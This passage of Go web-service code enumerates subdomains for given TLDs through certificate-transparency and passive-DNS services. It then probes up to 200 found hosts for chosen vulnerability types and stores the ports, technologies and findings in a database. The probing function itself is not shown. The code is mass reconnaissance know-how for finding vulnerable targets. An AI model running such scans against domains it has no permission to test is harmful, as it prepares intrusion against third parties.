		return nil, "certspotter", fmt.Errorf("certspotter HTTP %d", resp.StatusCode)
	}
	body, _ := io.ReadAll(resp.Body)
	var entries []struct {
		DNSNames []string `json:"dns_names"`
	}
	if err := json.Unmarshal(body, &entries); err != nil {
		return nil, "certspotter", fmt.Errorf("certspotter bad JSON: %w", err)
	}
	seen := map[string]bool{}
	var out []string
	for _, e := range entries {
		for _, d := range e.DNSNames {
			d = strings.TrimPrefix(d, "*.")
			if d != "" && !seen[d] && strings.HasSuffix(d, clean) {
				seen[d] = true
				out = append(out, d)
			}
		}
	}
	return out, "certspotter", nil
}

func queryWithFallback(tld string) (domains []string, source string, errs []string) {
	funcs := []func(string) ([]string, string, error){
		queryCrtSh,
		queryHackerTarget,
		queryCertspotter,
	}
	for _, fn := range funcs {
		d, src, err := fn(tld)
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s[%s]: %s", tld, src, err.Error()))
			continue
		}
		return d, src, errs
	}
	return nil, "all-failed", errs
}

func DeepSearch(c *gin.Context) {
	var req FindRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if len(req.TLDs) == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "tlds required"})
		return
	}

	type tldResult struct {
		tld     string
		source  string
		domains []string
		errs    []string
	}
	tldCh := make(chan tldResult, len(req.TLDs))
	var wgOSINT sync.WaitGroup
	for _, tld := range req.TLDs {
		wgOSINT.Add(1)
		go func(t string) {
			defer wgOSINT.Done()
			domains, src, errs := queryWithFallback(t)
			tldCh <- tldResult{tld: t, source: src, domains: domains, errs: errs}
		}(tld)
	}
	wgOSINT.Wait()
	close(tldCh)

	seen := map[string]bool{}
	type rawDomain struct {
		domain string
		tld    string
		source string
	}
	var raw []rawDomain
	var sourceErrors []string
	for res := range tldCh {
		sourceErrors = append(sourceErrors, res.errs...)
		for _, d := range res.domains {
			if !seen[d] {
				seen[d] = true
				raw = append(raw, rawDomain{domain: d, tld: res.tld, source: res.source})
			}
		}
	}

	if len(raw) > 200 {
		raw = raw[:200]
	}
	type probeResult struct {
		domain string
		tld    string
		source string
		info   probeInfo
	}
	probeCh := make(chan probeResult, len(raw))
	sem := make(chan struct{}, 15)
	var wgProbe sync.WaitGroup
	for _, r := range raw {
		wgProbe.Add(1)
		go func(d rawDomain) {
			defer wgProbe.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			probeCh <- probeResult{
				domain: d.domain, tld: d.tld, source: d.source,
				info: probeTarget(d.domain, req.VulnTypes),
			}
		}(r)
	}
	wgProbe.Wait()
	close(probeCh)

	var targets []FoundTarget
	for res := range probeCh {
		i := res.info
		status := "offline"
		if i.alive {
			status = "online"
		}
		indicator := "passive-dns"
		if len(i.tech) > 0 {
			indicator = strings.Join(i.tech, ", ")
		}
		matchReason := fmt.Sprintf(
			"Subdomain matched TLD pattern %q via %s (certificate-transparency / passive DNS). "+
				"Category: %s. Tested for vuln types: %s.",
			res.tld, res.source, req.Category,
			strings.Join(req.VulnTypes, ", "),
		)
		targets = append(targets, FoundTarget{
			Domain:        res.domain,
			Category:      req.Category,
			Indicator:     indicator,
			Source:        fmt.Sprintf("%s (%s)", res.source, res.tld),
			Status:        status,
			StatusCode:    i.statusCode,
			Title:         i.title,
			Tech:          strings.Join(i.tech, ", "),
			IP:            i.ip,
			FinalURL:      i.finalURL,
			Findings:      i.findings,
			Headers:       i.headers,
			OpenPorts:     i.openPorts,
			Tests:         i.tests,
			OfflineReason: i.offlineReason,
			MatchReason:   matchReason,
		})
	}
	if targets == nil {
		targets = []FoundTarget{}
	}
	if sourceErrors == nil {
		sourceErrors = []string{}
	}

	tldsJSON, _ := json.Marshal(req.TLDs)
	vulnsJSON, _ := json.Marshal(req.VulnTypes)
	scanID := uuid.New().String()
	now := time.Now().UTC().Format(time.RFC3339)

	db.DB.Exec(
		`INSERT INTO find_scans (id, category, tlds, vuln_types, status, total, finished_at)
		 VALUES (?, ?, ?, ?, 'completed', ?, ?)`,
		scanID, req.Category, string(tldsJSON), string(vulnsJSON), len(targets), now,
	)

	for _, t := range targets {
		findingsJSON, _ := json.Marshal(t.Findings)
		headersJSON, _ := json.Marshal(t.Headers)
		portsJSON, _ := json.Marshal(t.OpenPorts)
		testsJSON, _ := json.Marshal(t.Tests)
		db.DB.Exec(
			`INSERT INTO find_targets
			 (scan_id, domain, category, indicator, source, status, status_code,
			  title, tech, ip, final_url, findings, headers, open_ports,
			  tests, offline_reason, match_reason)
			 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
			scanID, t.Domain, t.Category, t.Indicator, t.Source, t.Status,
			t.StatusCode, t.Title, t.Tech, t.IP, t.FinalURL,
			string(findingsJSON), string(headersJSON), string(portsJSON),
			string(testsJSON), t.OfflineReason, t.MatchReason,
		)
	}

	c.JSON(http.StatusOK, gin.H{
		"scan_id": scanID,
		"targets": targets,
		"count":   len(targets),
		"errors":  sourceErrors,
	})
}

func ListFindScans(c *gin.Context) {
	rows, err := db.DB.Query(
		`SELECT id, category, tlds, vuln_types, status, total, created_at, finished_at
		 FROM find_scans ORDER BY created_at DESC LIMIT 50`,
	)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	defer rows.Close()

	var scans []map[string]any
	for rows.Next() {
		var id, category, tlds, vulnTypes, status string
		var total int
		var createdAt string
		var finishedAt *string
		if err := rows.Scan(&id, &category, &tlds, &vulnTypes, &status, &total, &createdAt, &finishedAt); err != nil {
			continue
		}
		var tldsArr, vulnsArr []string
		json.Unmarshal([]byte(tlds), &tldsArr)
		json.Unmarshal([]byte(vulnTypes), &vulnsArr)
		scans = append(scans, map[string]any{
			"id": id, "category": category, "tlds": tldsArr,
			"vuln_types": vulnsArr, "status": status, "total": total,
			"created_at": createdAt, "finished_at": finishedAt,
		})
	}
	if scans == nil {
		scans = []map[string]any{}
	}
	c.JSON(http.StatusOK, scans)
}

func GetFindTargets(c *gin.Context) {
	id := c.Param("id")
	rows, err := db.DB.Query(
		`SELECT id, domain, category, indicator, source, status,
		        COALESCE(status_code,0), COALESCE(title,''), COALESCE(tech,''),
		        COALESCE(ip,''), COALESCE(final_url,''),
		        COALESCE(findings,''), COALESCE(headers,''), COALESCE(open_ports,''),
		        COALESCE(tests,''), COALESCE(offline_reason,''), COALESCE(match_reason,'')
		 FROM find_targets WHERE scan_id = ?
		 ORDER BY status DESC, domain ASC`,
		id,
	)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	defer rows.Close()

	var targets []map[string]any
	for rows.Next() {
		var rowID, statusCode int
		var domain, category, indicator, source, status, title, tech, ip, finalURL string
		var findings, headers, openPorts, tests, offlineReason, matchReason string
		if err := rows.Scan(&rowID, &domain, &category, &indicator, &source, &status,
			&statusCode, &title, &tech, &ip, &finalURL,
			&findings, &headers, &openPorts, &tests, &offlineReason, &matchReason); err != nil {
			continue
		}
		var findingsArr []TargetFinding
		json.Unmarshal([]byte(findings), &findingsArr)
		var headersMap map[string]string
		json.Unmarshal([]byte(headers), &headersMap)
		var portsArr []int
		json.Unmarshal([]byte(openPorts), &portsArr)
		var testsArr []ProbeTest
		json.Unmarshal([]byte(tests), &testsArr)
		targets = append(targets, map[string]any{
			"id": rowID, "domain": domain, "category": category,
			"indicator": indicator, "source": source, "status": status,
			"status_code": statusCode, "title": title, "tech": tech,
			"ip": ip, "final_url": finalURL,
			"findings": findingsArr, "headers": headersMap, "open_ports": portsArr,
			"tests": testsArr, "offline_reason": offlineReason, "match_reason": matchReason,
		})
	}
	if targets == nil {
		targets = []map[string]any{}
	}
	c.JSON(http.StatusOK, targets)
}
